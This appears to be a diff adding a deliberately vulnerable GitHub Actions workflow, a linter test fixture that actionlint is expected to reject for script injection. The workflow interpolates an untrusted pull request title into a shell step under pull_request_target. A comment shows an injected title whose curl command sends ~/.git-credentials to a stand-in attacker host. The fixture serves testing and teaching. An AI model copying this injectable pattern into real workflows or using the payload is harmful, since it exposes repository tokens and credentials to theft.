@@ -1,0 +1,21 @@
+# MUST FAIL actionlint: script injection. check-actions.sh asserts actionlint rejects this file with:
+# expect-error: "github.event.pull_request.title" is potentially untrusted
+name: Injectable
+
+on:
+  pull_request_target:               # runs with a WRITE token and secrets, even for forks
+
+permissions:
+  pull-requests: write
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      # region injection
+      # ❌ ${{ }} is pasted into the script BEFORE bash runs. A PR titled
+      #    a"; curl -d @$HOME/.git-credentials https://evil.example; echo "
+      # runs that curl with this job's token.
+      - run: |
+          echo "Thanks for: ${{ github.event.pull_request.title }}"
+      # endregion injection
